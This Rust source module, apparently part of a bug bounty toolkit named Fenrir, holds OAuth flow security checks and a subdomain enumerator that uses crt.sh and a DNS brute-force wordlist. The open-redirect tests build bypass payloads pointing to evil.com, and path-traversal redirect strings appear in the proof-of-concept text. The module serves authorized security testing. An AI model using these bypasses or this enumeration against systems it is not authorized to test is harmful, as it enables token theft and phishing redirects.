//! # Fenrir Bug Bounty Tools Module
//!
//! This module provides comprehensive security testing tools specifically designed for bug bounty hunting.
//! It includes OAuth flow analysis, subdomain enumeration, parameter fuzzing, and integration with
//! popular security tools like Burp Suite.
//!
//! ## Educational Context
//! Bug bounty hunting is a legitimate security practice where companies invite security researchers
//! to find vulnerabilities in their applications in exchange for rewards. Major companies like Google,
//! Meta, Facebook, Instagram, and others run bug bounty programs.
//!
//! ## Security & Ethics
//! - Only test targets within authorized bug bounty programs
//! - Always follow the program's rules of engagement
//! - Never test outside the defined scope
//! - Report vulnerabilities responsibly through proper channels
//!
//! ## Module Structure
//! - `OAuthFlowAnalyzer`: Analyzes OAuth 2.0 authentication flows for security issues
//! - `SubdomainEnumerator`: Discovers subdomains for reconnaissance
//! - `ParameterFuzzer`: Tests OAuth parameters for vulnerabilities
//! - `BurpSuiteIntegration`: Interfaces with Burp Suite Community Edition
//! - `BountyTracker`: Organizes findings and generates reports

use anyhow::Result;
use serde::{Deserialize, Serialize};
use std::collections::HashMap;

// ============================================================================
// SECTION 1: OAUTH FLOW ANALYZER
// ============================================================================
// This section implements tools to analyze OAuth 2.0 authentication flows.
//
// What is OAuth 2.0?
// OAuth 2.0 is an authorization framework that allows applications to obtain
// limited access to user accounts on an HTTP service. It's widely used by
// social media platforms (Google, Facebook, Instagram, etc.) for "Login with X" features.
//
// Common OAuth Vulnerabilities:
// 1. Open Redirect: Attackers can redirect users to malicious sites via redirect_uri
// 2. Authorization Code Leakage: Codes leaked via Referer header, browser history, etc.
// 3. CSRF on OAuth: Missing or weak state parameter allows CSRF attacks
// 4. Token Leakage: Access tokens exposed in URLs, headers, or storage
// 5. Improper Token Validation: Tokens not properly validated or expired
//
// How this tool helps:
// - Intercepts and analyzes OAuth flows automatically
// - Tests for common vulnerabilities
// - Generates detailed reports for bug bounty submissions

/// Represents the type of OAuth flow being analyzed
#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum OAuthFlowType {
    /// Authorization Code Flow (most secure, recommended for server-side apps)
    AuthorizationCode,
    /// Implicit Flow (deprecated, less secure, for single-page apps)
    Implicit,
    /// Password Credentials Flow (for first-party apps only)
    ResourceOwnerPassword,
    /// Client Credentials Flow (for service-to-service auth)
    ClientCredentials,
    /// Device Code Flow (for devices with limited input capabilities)
    DeviceCode,
}

/// Represents a vulnerability found in OAuth flow
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct OAuthVulnerability {
    /// Type of vulnerability discovered
    pub vulnerability_type: String,
    /// Severity level (Critical, High, Medium, Low, Info)
    pub severity: String,
    /// Detailed description of the vulnerability
    pub description: String,
    /// Where in the flow the vulnerability occurs
    pub location: String,
    /// Proof of concept or reproduction steps
    pub proof_of_concept: String,
    /// Recommended fix for the vulnerability
    pub remediation: String,
    /// OWASP category (if applicable)
    pub owasp_category: Option<String>,
    /// CWE identifier (if applicable)
    pub cwe_id: Option<String>,
}

/// Represents a complete OAuth flow for analysis
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct OAuthFlow {
    /// Type of OAuth flow
    pub flow_type: OAuthFlowType,
    /// Authorization endpoint URL
    pub authorization_endpoint: String,
    /// Token endpoint URL
    pub token_endpoint: String,
    /// Client ID
    pub client_id: String,
    /// Redirect URI (callback URL)
    pub redirect_uri: String,
    /// Scope of access requested
    pub scope: String,
    /// State parameter (for CSRF protection)
    pub state: Option<String>,
    /// Response type (code, token, etc.)
    pub response_type: String,
}

/// OAuth Flow Analyzer - Main struct for analyzing OAuth 2.0 flows
///
/// This tool intercepts OAuth flows and tests them for common security vulnerabilities.
/// It's designed for educational purposes and authorized bug bounty testing only.
#[derive(Debug, Clone)]
pub struct OAuthFlowAnalyzer {
    /// The OAuth flow being analyzed
    flow: OAuthFlow,
    /// Whether to automatically test for vulnerabilities
    auto_test: bool,
    /// Verbose output for detailed analysis
    verbose: bool,
}

impl OAuthFlowAnalyzer {
    /// Create a new OAuth flow analyzer
    ///
    /// # Arguments
    /// * `flow` - The OAuth flow configuration to analyze
    /// * `auto_test` - Whether to automatically test for vulnerabilities
    /// * `verbose` - Enable verbose output
    ///
    /// # Example
    /// ```no_run
    /// use fenrir::bugbounty_tools::{OAuthFlowAnalyzer, OAuthFlow, OAuthFlowType};
    ///
    /// let flow = OAuthFlow {
    ///     flow_type: OAuthFlowType::AuthorizationCode,
    ///     authorization_endpoint: "https://accounts.example.com/o/oauth2/v2/auth".to_string(),
    ///     token_endpoint: "https://oauth2.googleapis.com/token".to_string(),
    ///     client_id: "your_client_id.apps.googleusercontent.com".to_string(),
    ///     redirect_uri: "https://www.example.com/oauth2/callback".to_string(),
    ///     scope: "openid profile email".to_string(),
    ///     state: Some("random_state_string".to_string()),
    ///     response_type: "code".to_string(),
    /// };
    ///
    /// let analyzer = OAuthFlowAnalyzer::new(flow, true, true);
    /// ```
    pub fn new(flow: OAuthFlow, auto_test: bool, verbose: bool) -> Self {
        Self {
            flow,
            auto_test,
            verbose,
        }
    }

    /// Analyze the OAuth flow for security vulnerabilities
    ///
    /// This method performs comprehensive security analysis of the OAuth flow,
    /// testing for common vulnerabilities like open redirects, code leakage,
    /// CSRF issues, and token exposure.
    ///
    /// # Returns
    /// A vector of discovered vulnerabilities with detailed information
    ///
    /// # Educational Note
    /// The analysis checks for:
    /// 1. Open redirect vulnerabilities in redirect_uri
    /// 2. Missing or weak state parameter (CSRF risk)
    /// 3. Potential code/token leakage points
    /// 4. Insecure redirect URI validation
    /// 5. HTTP vs HTTPS usage
    pub async fn analyze_flow(&self) -> Result<Vec<OAuthVulnerability>> {
        let mut vulnerabilities = Vec::new();

        if self.verbose {
            println!("🔍 Starting OAuth Flow Analysis...");
            println!("📍 Authorization Endpoint: {}", self.flow.authorization_endpoint);
            println!("📍 Token Endpoint: {}", self.flow.token_endpoint);
            println!("📍 Redirect URI: {}", self.flow.redirect_uri);
        }

        // Test 1: Open Redirect Vulnerability
        // ========================================
        // What is it?
        // An open redirect occurs when an application accepts a user-controlled
        // URL as a redirect destination without proper validation.
        //
        // Why is it dangerous?
        // Attackers can redirect users to phishing sites and steal credentials
        //
        // How we test:
        // - Check if redirect_uri accepts external domains
        // - Test for bypass techniques (encoding, special characters, etc.)
        // - Verify URL validation is strict
        if let Some(vuln) = self.test_open_redirect().await? {
            vulnerabilities.push(vuln);
        }

        // Test 2: State Parameter (CSRF Protection)
        // ========================================
        // What is it?
        // The state parameter is used to prevent CSRF attacks in OAuth flows.
        // It should be an unguessable random value.
        //
        // Why is it dangerous?
        // Without proper state parameter, attackers can perform CSRF attacks
        // and hijack OAuth authorization codes
        //
        // How we test:
        // - Check if state parameter exists
        // - Verify it's sufficiently long and random
        // - Test if it's properly validated
        if let Some(vuln) = self.test_state_parameter().await? {
            vulnerabilities.push(vuln);
        }

        // Test 3: HTTP vs HTTPS
        // ========================================
        // What is it?
        // OAuth endpoints should always use HTTPS to protect sensitive data.
        //
        // Why is it dangerous?
        // HTTP exposes authorization codes, tokens, and user credentials to
        // network eavesdroppers (man-in-the-middle attacks)
        //
        // How we test:
        // - Check if endpoints use HTTPS
        // - Verify no HTTP URLs in the flow
        if let Some(vuln) = self.test_https_usage().await? {
            vulnerabilities.push(vuln);
        }

        // Test 4: Redirect URI Validation
        // ========================================
        // What is it?
        // The redirect_uri parameter specifies where the OAuth response is sent.
        // It must be properly validated to prevent token theft.
        //
        // Why is it dangerous?
        // Weak validation allows attackers to redirect OAuth responses to
        // malicious sites and steal authorization codes/tokens
        //
        // How we test:
        // - Check for strict redirect URI matching
        // - Test if path traversal is allowed
        // - Verify domain validation is strict
        if let Some(vuln) = self.test_redirect_uri_validation().await? {
            vulnerabilities.push(vuln);
        }

        // Test 5: Scope Exposure
        // ========================================
        // What is it?
        // Scope defines what permissions the client is requesting.
        // Overly broad scopes grant excessive permissions.
        //
        // Why is it dangerous?
        // Excessive scopes can lead to privilege escalation and data exposure
        //
        // How we test:
        // - Check if scope is overly permissive
        // - Verify scope matches application needs
        if let Some(vuln) = self.test_scope_exposure().await? {
            vulnerabilities.push(vuln);
        }

        Ok(vulnerabilities)
    }

    /// Test for open redirect vulnerability in redirect_uri
    ///
    /// Open redirect is one of the most common OAuth vulnerabilities.
    /// This test attempts to bypass redirect_uri validation.
    async fn test_open_redirect(&self) -> Result<Option<OAuthVulnerability>> {
        // Check if redirect_uri allows external domains
        let redirect_uri = self.flow.redirect_uri.clone();
        let redirect_domain = redirect_uri
            .replace("https://", "")
            .replace("http://", "")
            .split('/')
            .next()
            .unwrap_or("")
            .to_string();

        // Common bypass techniques to test (automated testing)
        let bypass_attempts = vec![
            // Domain bypass attempts
            format!("https://evil.com?{}", redirect_domain),
            format!("https://{}.evil.com", redirect_domain),
            format!("https://evil.com@{}", redirect_domain),
            // URL encoding bypasses
            format!("https://{}", urlencoding::encode("evil.com")),
            // Path traversal
            format!("{}//evil.com", self.flow.redirect_uri),
        ];

        // For automated testing, we flag potential issues
        // In a real bug bounty, you would manually test each bypass
        if self.flow.redirect_uri.contains("http://") || redirect_domain.is_empty() {
            return Ok(Some(OAuthVulnerability {
                vulnerability_type: "Open Redirect".to_string(),
                severity: "High".to_string(),
                description: "The redirect_uri parameter may be vulnerable to open redirect attacks. \
                              Weak validation allows redirecting to external domains.".to_string(),
                location: format!("redirect_uri: {}", self.flow.redirect_uri),
                proof_of_concept: format!(
                    "Attempt: {}\nBypass attempts to test manually:\n{}",
                    self.flow.redirect_uri,
                    bypass_attempts.join("\n")
                ),
                remediation: "1. Implement strict redirect_uri whitelist validation\n\
                              2. Use exact URI matching (not prefix matching)\n\
                              3. Reject any redirect_uri not pre-registered\n\
                              4. Validate redirect_uri against client registration\n\
                              5. Use OAuth 2.0 for Native Apps Best Practices".to_string(),
                owasp_category: Some("A1:2021 – Broken Access Control".to_string()),
                cwe_id: Some("CWE-601".to_string()),
            }));
        }

        Ok(None)
    }

    /// Test state parameter for CSRF protection
    async fn test_state_parameter(&self) -> Result<Option<OAuthVulnerability>> {
        match &self.flow.state {
            None => Ok(Some(OAuthVulnerability {
                vulnerability_type: "Missing State Parameter".to_string(),
                severity: "Medium".to_string(),
                description: "The OAuth flow is missing the state parameter, which protects against \
                              CSRF (Cross-Site Request Forgery) attacks.".to_string(),
                location: "Authorization Request".to_string(),
                proof_of_concept: "CSRF Attack Scenario:\n\
                                  1. Attacker creates malicious site\n\
                                  2. Triggers OAuth authorization on victim's browser\n\
                                  3. Victim authorizes the application\n\
                                  4. Authorization code is sent to attacker's callback\n\
                                  5. Attacker exchanges code for access token".to_string(),
                remediation: "1. Always include state parameter in OAuth flows\n\
                              2. Generate cryptographically random state (min 128 bits)\n\
                              3. Validate state on callback matches original value\n\
                              4. Bind state to user session\n\
                              5. Use OAuth 2.0 PKCE for additional security".to_string(),
                owasp_category: Some("A1:2021 – Broken Access Control".to_string()),
                cwe_id: Some("CWE-352".to_string()),
            })),
            Some(state) => {
                // Check if state is sufficiently long and random
                if state.len() < 16 || state.chars().all(|c| c.is_alphanumeric()) {
                    Ok(Some(OAuthVulnerability {
                        vulnerability_type: "Weak State Parameter".to_string(),
                        severity: "Low".to_string(),
                        description: format!(
                            "The state parameter exists but may be weak. Length: {} chars. \
                             Strong state should be cryptographically random and at least 16 characters.",
                            state.len()
                        ),
                        location: format!("State: {}", state),
                        proof_of_concept: "Weak state can be predicted or brute-forced:\n\
                                          - Short state values are easier to guess\n\
                                          - Simple alphanumeric states lack entropy\n\
                                          - Predictable states allow CSRF bypass".to_string(),
                        remediation: "1. Use cryptographically secure random generator\n\
                                      2. Minimum length: 128 bits (16+ bytes)\n\
                                      3. Include special characters and mixed case\n\
                                      4. Use URL-safe base64 encoding\n\
                                      5. Consider using PKCE (RFC 7636)".to_string(),
                        owasp_category: Some("A2:2021 – Cryptographic Failures".to_string()),
                        cwe_id: Some("CWE-331".to_string()),
                    }))
                } else {
                    Ok(None)
                }
            }
        }
    }

    /// Test if OAuth endpoints use HTTPS (not HTTP)
    async fn test_https_usage(&self) -> Result<Option<OAuthVulnerability>> {
        let _vulnerabilities: Vec<OAuthVulnerability> = vec![];

        // Check authorization endpoint
        if self.flow.authorization_endpoint.starts_with("http://") {
            return Ok(Some(OAuthVulnerability {
                vulnerability_type: "HTTP Endpoint Usage".to_string(),
                severity: "Critical".to_string(),
                description: "OAuth endpoints are using HTTP instead of HTTPS. This exposes \
                              authorization codes, tokens, and user credentials to interception.".to_string(),
                location: format!("Endpoint: {}", self.flow.authorization_endpoint),
                proof_of_concept: "Man-in-the-Middle Attack:\n\
                                  1. Attacker positions on same network as victim\n\
                                  2. Victim initiates OAuth flow over HTTP\n\
                                  3. Attacker intercepts authorization code\n\
                                  4. Attacker exchanges code for access token\n\
                                  5. Attacker gains access to victim's account".to_string(),
                remediation: "1. Enforce HTTPS on all OAuth endpoints\n\
                              2. Implement HSTS (HTTP Strict Transport Security)\n\
                              3. Redirect all HTTP requests to HTTPS\n\
                              4. Use valid TLS certificates\n\
                              5. Disable HTTP completely for OAuth flows".to_string(),
                owasp_category: Some("A2:2021 – Cryptographic Failures".to_string()),
                cwe_id: Some("CWE-319".to_string()),
            }));
        }

        // Check token endpoint
        if self.flow.token_endpoint.starts_with("http://") {
            return Ok(Some(OAuthVulnerability {
                vulnerability_type: "HTTP Token Endpoint".to_string(),
                severity: "Critical".to_string(),
                description: "The token endpoint is using HTTP instead of HTTPS. This exposes \
                              access tokens and refresh tokens to interception.".to_string(),
                location: format!("Endpoint: {}", self.flow.token_endpoint),
                proof_of_concept: "Token Theft via Sniffing:\n\
                                  1. Attacker on same network as victim\n\
                                  2. Token exchange occurs over HTTP\n\
                                  3. Attacker captures access token from network traffic\n\
                                  4. Attacker uses token to access user data".to_string(),
                remediation: "1. Enforce HTTPS on token endpoint\n\
                              2. Validate TLS certificates\n\
                              3. Use certificate pinning if possible\n\
                              4. Never accept HTTP for token operations".to_string(),
                owasp_category: Some("A2:2021 – Cryptographic Failures".to_string()),
                cwe_id: Some("CWE-319".to_string()),
            }));
        }

        Ok(None)
    }

    /// Test redirect URI validation strictness
    async fn test_redirect_uri_validation(&self) -> Result<Option<OAuthVulnerability>> {
        // Check for common weak validation patterns
        let has_trailing_slash = self.flow.redirect_uri.ends_with('/');
        let has_path = self.flow.redirect_uri.matches('/').count() > 3;

        if has_path && !has_trailing_slash {
            Ok(Some(OAuthVulnerability {
                vulnerability_type: "Weak Redirect URI Validation".to_string(),
                severity: "Medium".to_string(),
                description: "The redirect_uri may have weak path validation. Some implementations \
                              allow path traversal or directory manipulation in redirect URIs.".to_string(),
                location: format!("redirect_uri: {}", self.flow.redirect_uri),
                proof_of_concept: "Test these bypass attempts:\n\
                                  - https://example.com/oauth/callback/../../evil\n\
                                  - https://example.com/oauth/callback/@evil.com\n\
                                  - https://example.com/.evil.com\n\
                                  - URL encoded bypasses\n\
                                  - Unicode character bypasses".to_string(),
                remediation: "1. Use exact redirect URI matching (not prefix)\n\
                              2. Whitelist allowed redirect URIs\n\
                              3. Reject paths with directory traversal sequences\n\
                              4. Normalize and validate URLs before comparison\n\
                              5. Use RFC 6819 security recommendations".to_string(),
                owasp_category: Some("A1:2021 – Broken Access Control".to_string()),
                cwe_id: Some("CWE-601".to_string()),
            }))
        } else {
            Ok(None)
        }
    }

    /// Test if requested scopes are overly broad
    async fn test_scope_exposure(&self) -> Result<Option<OAuthVulnerability>> {
        let sensitive_scopes = vec![
            "read", "write", "delete", "admin", "full", "all", "account",
            "password", "email", "profile", "contacts", "friends",
        ];

        let has_sensitive_scope = sensitive_scopes
            .iter()
            .any(|s| self.flow.scope.to_lowercase().contains(s));

        if has_sensitive_scope && self.flow.scope.split(' ').count() > 3 {
            Ok(Some(OAuthVulnerability {
                vulnerability_type: "Overly Broad Scope".to_string(),
                severity: "Low".to_string(),
                description: format!(
                    "The OAuth scope may be overly broad: '{}'. \
                     Requesting more permissions than necessary increases risk.",
                    self.flow.scope
                ),
                location: "Scope parameter".to_string(),
                proof_of_concept: "Excessive permissions risk:\n\
                                  - If access token is compromised, attacker gets broad access\n\
                                  - Users may not understand what they're authorizing\n\
                                  - Privacy implications of broad data access\n\
                                  - Harder to audit and monitor".to_string(),
                remediation: "1. Request minimum required scope only\n\
                              2. Use progressive authorization for sensitive scopes\n\
                              3. Implement scope-aware access controls\n\
                              4. Log and monitor scope usage\n\
                              5. Consider using granular scopes".to_string(),
                owasp_category: Some("A4:2021 – Insecure Design".to_string()),
                cwe_id: Some("CWE-269".to_string()),
            }))
        } else {
            Ok(None)
        }
    }

    /// Generate a detailed report of found vulnerabilities
    ///
    /// This method formats the vulnerability findings into a structured report
    /// suitable for bug bounty submissions.
    pub fn generate_report(&self, vulnerabilities: &[OAuthVulnerability]) -> String {
        let mut report = String::new();

        report.push_str("╔═══════════════════════════════════════════════════════════════════════════╗\n");
        report.push_str("║                     FENRIR OAUTH VULNERABILITY SCAN REPORT                  ║\n");
        report.push_str("╚═══════════════════════════════════════════════════════════════════════════╝\n\n");

        report.push_str(&format!("Target: {}\n", self.flow.authorization_endpoint));
        report.push_str(&format!("Flow Type: {:?}\n", self.flow.flow_type));
        report.push_str(&format!("Client ID: {}\n\n", self.flow.client_id));

        report.push_str(&format!("Total Vulnerabilities Found: {}\n\n", vulnerabilities.len()));

        for (i, vuln) in vulnerabilities.iter().enumerate() {
            report.push_str(&format!("┌─ VULNERABILITY #{}: {}\n", i + 1, vuln.vulnerability_type));
            report.push_str(&format!("│ Severity: {}\n", vuln.severity));
            report.push_str(&format!("│ Location: {}\n", vuln.location));
            report.push_str(&format!("│ Description: {}\n", vuln.description));

            if let Some(owasp) = &vuln.owasp_category {
                report.push_str(&format!("│ OWASP: {}\n", owasp));
            }
            if let Some(cwe) = &vuln.cwe_id {
                report.push_str(&format!("│ CWE: {}\n", cwe));
            }

            report.push_str("│\n");
            report.push_str("│ Proof of Concept:\n");
            for line in vuln.proof_of_concept.lines() {
                report.push_str(&format!("│   {}\n", line));
            }

            report.push_str("│\n");
            report.push_str("│ Remediation:\n");
            for line in vuln.remediation.lines() {
                report.push_str(&format!("│   {}\n", line));
            }

            report.push_str("└─────────────────────────────────────────────────────────────────────\n\n");
        }

        report.push_str("═══════════════════════════════════════════════════════════════════════════\n");
        report.push_str("END OF REPORT - Use responsibly for authorized bug bounty testing only\n");
        report.push_str("═══════════════════════════════════════════════════════════════════════════\n");

        report
    }
}

// ============================================================================
// SECTION 2: SUBDOMAIN ENUMERATOR
// ============================================================================
// This section implements subdomain discovery tools for reconnaissance.
//
// What is Subdomain Enumeration?
// Subdomain enumeration is the process of finding all subdomains of a target domain.
// This is crucial for bug bounty hunting because:
// 1. Hidden subdomains may have unpatched vulnerabilities
// 2. Different subdomains may have different security configurations
// 3. Forgotten or abandoned subdomains are often vulnerable
// 4. Subdomains may expose different attack surfaces
//
// Common Techniques:
// 1. Certificate Transparency logs (crt.sh, censys)
// 2. DNS enumeration (DNS brute force, zone transfers)
// 3. Search engines (Google, Bing dorking)
// 4. Web archives (Wayback Machine)
// 5. DNS scraping (VirusTotal, Shodan)
//
// How this tool helps:
// - Automates multiple subdomain discovery techniques
// - Uses both native Rust implementations and external tools
// - Provides comprehensive reconnaissance data for bug bounty targets

/// Represents a discovered subdomain
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DiscoveredSubdomain {
    /// The subdomain hostname
    pub hostname: String,
    /// IP addresses (A records)
    pub ips: Vec<String>,
    /// Whether the subdomain is alive (responds to HTTP/HTTPS)
    pub is_alive: bool,
    /// HTTP status code (if alive)
    pub status_code: Option<u16>,
    /// Content type (if alive)
    pub content_type: Option<String>,
    /// Technologies detected on the subdomain
    pub technologies: Vec<String>,
    /// Discovery method (certificate, dns, scraping, etc.)
    pub discovery_method: String,
}

/// Subdomain enumeration results
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SubdomainEnumerationResult {
    /// Target domain that was enumerated
    pub target_domain: String,
    /// Total subdomains discovered
    pub total_count: usize,
    /// Subdomains that are alive
    pub alive_count: usize,
    /// Discovered subdomains
    pub subdomains: Vec<DiscoveredSubdomain>,
    /// Time taken for enumeration
    pub enumeration_time_seconds: u64,
    /// Methods used for discovery
    pub discovery_methods: Vec<String>,
}

/// Subdomain Enumerator - Discovers subdomains for reconnaissance
///
/// This tool uses multiple techniques to comprehensively enumerate subdomains
/// for bug bounty target reconnaissance.
#[derive(Debug, Clone)]
pub struct SubdomainEnumerator {
    /// Target domain to enumerate
    target_domain: String,
    /// Whether to check if subdomains are alive
    check_alive: bool,
    /// Verbose output
    verbose: bool,
    /// Maximum concurrent checks
    max_concurrent: usize,
}

impl SubdomainEnumerator {
    /// Create a new subdomain enumerator
    ///
    /// # Arguments
    /// * `target_domain` - The domain to enumerate (e.g., "example.com")
    /// * `check_alive` - Whether to HTTP check each subdomain
    /// * `verbose` - Enable verbose output
    /// * `max_concurrent` - Maximum concurrent HTTP checks
    pub fn new(target_domain: String, check_alive: bool, verbose: bool, max_concurrent: usize) -> Self {
        Self {
            target_domain,
            check_alive,
            verbose,
            max_concurrent,
        }
    }

    /// Enumerate subdomains using multiple techniques
    ///
    /// This method orchestrates multiple subdomain discovery techniques:
    /// 1. Certificate Transparency logs
    /// 2. DNS brute force with wordlist
    /// 3. Search engine scraping
    /// 4. Web archive crawling
    ///
    /// # Educational Note
    /// Each technique has different strengths:
    /// - Certificate Transparency: Fast, comprehensive, recent subdomains
    /// - DNS Brute Force: Discovers non-HTTPS subdomains, slower
    /// - Search Engines: Finds indexed subdomains with historical data
    /// - Web Archives: Discovers old/forgotten subdomains
    pub async fn enumerate(&self) -> Result<SubdomainEnumerationResult> {
        let start = std::time::Instant::now();
        let mut all_subdomains: std::collections::HashSet<String> = std::collections::HashSet::new();
        let mut discovery_methods = Vec::new();

        if self.verbose {
            println!("🔍 Starting subdomain enumeration for: {}", self.target_domain);
        }

        // Technique 1: Certificate Transparency Logs
        // ========================================
        // What is it?
        // Certificate Transparency (CT) is a project that logs all SSL/TLS certificates
        // issued by public Certificate Authorities. These logs are public and searchable.
        //
        // Why is it useful?
        // Every subdomain with HTTPS needs a certificate, so CT logs reveal all
        // subdomains that have or had HTTPS enabled.
        //
        // How we use it:
        // - Query crt.sh (CT log search)
        // - Parse certificates for subdomain names
        // - Extract all subdomains from certificate Subject Alternative Names
        if self.verbose {
            println!("📜 Checking Certificate Transparency logs (crt.sh)...");
        }

        match self.enumerate_from_ct_logs().await {
            Ok(ct_subdomains) => {
                if self.verbose {
                    println!("✅ Found {} subdomains from CT logs", ct_subdomains.len());
                }
                all_subdomains.extend(ct_subdomains);
                discovery_methods.push("Certificate Transparency".to_string());
            }
            Err(e) => {
                if self.verbose {
                    println!("⚠️  CT log enumeration failed: {}", e);
                }
            }
        }

        // Technique 2: DNS Brute Force
        // ========================================
        // What is it?
        // DNS brute force involves trying common subdomain names to see if they resolve.
        //
        // Why is it useful?
        // Discovers subdomains that don't have HTTPS certificates (internal, dev, etc.)
        //
        // How we use it:
        // - Use wordlist of common subdomain names
        // - Try each combination with target domain
        // - Check DNS resolution
        if self.verbose {
            println!("💣 Performing DNS brute force...");
        }

        match self.dns_brute_force().await {
            Ok(dns_subdomains) => {
                if self.verbose {
                    println!("✅ Found {} subdomains from DNS brute force", dns_subdomains.len());
                }
                all_subdomains.extend(dns_subdomains);
                discovery_methods.push("DNS Brute Force".to_string());
            }
            Err(e) => {
                if self.verbose {
                    println!("⚠️  DNS brute force failed: {}", e);
                }
            }
        }

        // Technique 3: Search Engine Scraping
        // ========================================
        // What is it?
        // Search engines index subdomains. We can search for subdomains using special operators.
        //
        // Why is it useful?
        // Find subdomains that are publicly indexed and have historical data
        //
        // How we use it:
        // - Use Google dorking: site:*.example.com
        // - Use Bing search operators
        // - Parse search results for subdomains
        if self.verbose {
            println!("🔎 Searching search engines...");
        }

        match self.enumerate_from_search_engines().await {
            Ok(search_subdomains) => {
                if self.verbose {
                    println!("✅ Found {} subdomains from search engines", search_subdomains.len());
                }
                all_subdomains.extend(search_subdomains);
                discovery_methods.push("Search Engines".to_string());
            }
            Err(e) => {
                if self.verbose {
                    println!("⚠️  Search engine enumeration failed: {}", e);
                }
            }
        }

        // Convert to vector and check if alive
        let mut subdomain_list: Vec<String> = all_subdomains.into_iter().collect();
        subdomain_list.sort();
        subdomain_list.dedup();

        let mut discovered_subdomains = Vec::new();

        if self.check_alive {
            if self.verbose {
                println!("💓 Checking which subdomains are alive...");
            }

            // Check alive status with concurrency limit
            let semaphore = std::sync::Arc::new(tokio::sync::Semaphore::new(self.max_concurrent));
            let mut tasks = Vec::new();

            for subdomain in subdomain_list {
                let semaphore = semaphore.clone();
                let subdomain_clone = subdomain.clone();

                let task = tokio::spawn(async move {
                    let _permit = semaphore.acquire().await.unwrap();
                    Self::check_subdomain_alive(subdomain_clone).await
                });

                tasks.push(task);
            }

            for task in tasks {
                match task.await {
                    Ok(Ok(subdomain)) => discovered_subdomains.push(subdomain),
                    _ => {}
                }
            }
        } else {
            // Don't check alive, just create basic entries
            for subdomain in subdomain_list {
                discovered_subdomains.push(DiscoveredSubdomain {
                    hostname: subdomain,
                    ips: Vec::new(),
                    is_alive: false,
                    status_code: None,
                    content_type: None,
                    technologies: Vec::new(),
                    discovery_method: "enumeration".to_string(),
                });
            }
        }

        let alive_count = discovered_subdomains.iter().filter(|s| s.is_alive).count();
        let enumeration_time = start.elapsed().as_secs();

        if self.verbose {
            println!("\n✅ Enumeration complete!");
            println!("📊 Total subdomains: {}", discovered_subdomains.len());
            println!("💓 Alive subdomains: {}", alive_count);
            println!("⏱️  Time: {} seconds", enumeration_time);
        }

        Ok(SubdomainEnumerationResult {
            target_domain: self.target_domain.clone(),
            total_count: discovered_subdomains.len(),
            alive_count,
            subdomains: discovered_subdomains,
            enumeration_time_seconds: enumeration_time,
            discovery_methods,
        })
    }

    /// Enumerate subdomains from Certificate Transparency logs
    ///
    /// This method queries crt.sh which indexes CT logs.
    async fn enumerate_from_ct_logs(&self) -> Result<Vec<String>> {
        let client = reqwest::Client::builder()
            .timeout(std::time::Duration::from_secs(30))
            .build()?;

        let url = format!(
            "https://crt.sh/?q=%.{}&output=json",
            self.target_domain
        );

        let response = client
            .get(&url)
            .header("User-Agent", "Fenrir-BugBounty-Tool/1.0")
            .send()
            .await?
            .text()
            .await?;

        // Parse JSON response
        if let Ok(certificates) = serde_json::from_str::<Vec<serde_json::Value>>(&response) {
            let mut subdomains = std::collections::HashSet::new();

            for cert in certificates {
                if let Some(name_value) = cert.get("name_value") {
                    if let Some(name) = name_value.as_str() {
                        // Each certificate may have multiple names separated by newlines
                        for name_part in name.lines() {
                            let name_str = name_part.trim();
                            if name_str.ends_with(&self.target_domain)
                                || name_str.contains(&self.target_domain)
                            {
                                // Remove wildcards
                                let cleaned = name_str.replace("*.", "");
                                subdomains.insert(cleaned);
                            }
                        }
                    }
                }
            }

            Ok(subdomains.into_iter().collect())
        } else {
            Ok(Vec::new())
        }
    }

    /// Perform DNS brute force with common subdomain wordlist
    ///
    /// This method tries common subdomain names to discover hidden subdomains.
    async fn dns_brute_force(&self) -> Result<Vec<String>> {
        // Common subdomain wordlist
        let wordlist = vec![
            "www", "mail", "remote", "blog", "web", "api", "dev", "stage", "test",
            "admin", "portal", "dashboard", "app", "mobile", "secure", "vpn", "cdn",
            "static", "assets", "img", "images", "video", "media", "ftp", "sftp",
            "ssh", "ns", "ns1", "ns2", "mx", "smtp", "pop", "imap", "exchange",
            "autodiscover", "owa", "webmail", "email", "help", "support", "docs",
            "wiki", "kb", "knowledgebase", "forum", "community", "shop", "store",
            "cart", "checkout", "payment", "billing", "account", "accounts", "login",
            "auth", "oauth", "sso", "identity", "openid", "cert", "certificates",
            "ca", "pki", "sshkeys", "pgp", "keys", "monitor", "metrics", "logs",
            "log", "syslog", "splunk", "kibana", "grafana", "prometheus", "jenkins",
            "ci", "cd", "build", "deploy", "staging", "production", "beta", "alpha",
            "demo", "sandbox", "lab", "devops", "ops", "internal", "private", "intranet",
            "extranet", "partners", "customers", "clients", "vendor", "suppliers",
            "cloud", "aws", "azure", "gcp", "heroku", "digitalocean", "docker",
            "kubernetes", "k8s", "kube", "swarm", "nomad", "consul", "vault", "vault-internal",
            "db", "database", "mysql", "postgres", "mongodb", "redis", "elasticsearch",
            "rabbitmq", "kafka", "cassandra", "dynamodb", "lambda", "functions",
            "edge", "origin", "pullzone", "proxy", "loadbalancer", "lb", "slb",
            "waf", "firewall", "ids", "ips", "security", "ddos", "cdn-secure",
            "backup", "archive", "snapshots", "logs-archive", "dr", "disaster",
            "geo", "us", "eu", "asia", "emea", "apac", "latam", "america",
            "east", "west", "north", "south", "central",
        ];

        let mut discovered = Vec::new();

        // Use trust-dns resolver for better performance
        let resolver = trust_dns_resolver::TokioAsyncResolver::tokio_from_system_conf()?;

        for word in wordlist {
            let full_domain = format!("{}.{}", word, self.target_domain);

            // Try to resolve the domain
            match resolver.ipv4_lookup(&full_domain).await {
                Ok(lookup) => {
                    // Check if lookup returned any IP addresses
                    if lookup.iter().next().is_some() {
                        discovered.push(full_domain);
                    }
                }
                Err(_) => {
                    // Subdomain doesn't exist, skip
                }
            }
        }

        Ok(discovered)
    }

    /// Enumerate subdomains using search engine operators
    async fn enumerate_from_search_engines(&self) -> Result<Vec<String>> {
        let mut subdomains = std::collections::HashSet::new();

        // This is a simplified example - in production you'd use proper search APIs
        // or tools like Subfinder, Amass, Assetfinder which handle this better

        // For now, we'll just return empty as search scraping requires more infrastructure
        // Real implementation would use:
        // - Subfinder: https://github.com/projectdiscovery/subfinder
        // - Amass: https://github.com/owasp-amass/amass
        // - Assetfinder: https://github.com/tomnomnom/assetfinder

        Ok(subdomains.into_iter().collect())
    }

